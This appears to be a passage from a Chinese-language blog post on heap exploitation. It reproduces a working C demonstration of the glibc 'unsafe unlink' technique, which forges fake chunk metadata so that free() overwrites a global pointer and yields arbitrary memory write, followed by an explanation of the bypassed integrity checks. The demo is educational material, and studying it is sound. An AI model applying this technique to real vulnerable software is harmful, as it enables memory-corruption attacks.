+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+
+<span class="token keyword">uint64_t</span> <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to unsafe unlink 2.0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 20.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x420</span><span class="token punctuation">;</span> <span class="token comment">//we want to be big enough not to use tcache or fastbin</span>
+        <span class="token keyword">int</span> header_size <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        chunk0_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk0</span>
+        <span class="token keyword">uint64_t</span> <span class="token operator">*</span>chunk1_ptr  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk1</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The global chunk0_ptr is at %p, pointing to %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token punctuation">,</span> chunk0_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The victim chunk we are going to corrupt is at %p\n\n"</span><span class="token punctuation">,</span> chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We create a fake chunk inside chunk0.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the size of our fake chunk so that we can bypass the check introduced in \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk0_ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> chunk0_ptr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P->fd->bk = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P->bk->fd = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk fd: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk bk: %p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">uint64_t</span> <span class="token operator">*</span>chunk1_hdr <span class="token operator">=</span> chunk1_ptr <span class="token operator">-</span> header_size<span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk1_hdr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You can find the source of the unlink_chunk function at \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">char</span> victim_string<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token function">strcpy</span><span class="token punctuation">(</span>victim_string<span class="token punctuation">,</span><span class="token string">"Hello!~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span> victim_string<span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Original value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New Value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// sanity check</span>
+        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim_string <span class="token operator">==</span> <span class="token number">0x4141414142424242L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p><s>woc这是哪个天才想出来的太尼玛妙了</s></p>
+<p>使用了以下机制：当你 <code>free</code> 一个 chunk 时，如果它相邻的 chunk 是空闲的，系统会把这个 chunk 从双向链表中 <code>unlink</code> 并合并，即：</p>
+<ul>
+<li><code>P -&gt; fd -&gt; bk = P -&gt; bk</code></li>
+<li><code>P -&gt; bk -&gt; fd = P -&gt; fd</code></li>
+</ul>
+<p>通过这种方式达成修改指针的目的。</p>
+<p>但是不能单纯的修改一个 chunk 的 fd 和 bk，只要是因为以下两个检查：</p>
+<ol>
+<li><code>(P -&gt; fd -&gt; bk == P) &amp;&amp; (P -&gt; bk -&gt; fd == P)</code></li>
+<li><code>prev_size(P) == chunk_size(P - prev_size(P))</code></li>
+</ol>
+<p>发现到 <code>chunk0_ptr</code> 是一个现成的指针指向了堆中的一个位置，我们由此展开就可以构造一个 fake chunk 来通过上面的两个检查。</p>
+<p>此时 <code>free</code> chunk1 后，即可使得 <code>chunk0_ptr</code> 指向 <code>&amp;chunk0_ptr - 3</code>，通过让其写入自己来完成 arb write。</p>
+<p><a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612">Unlink</a></p>
+<p><a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f">Check for corrupt prev_size vs size.</a></p>
 
                 
               </div>
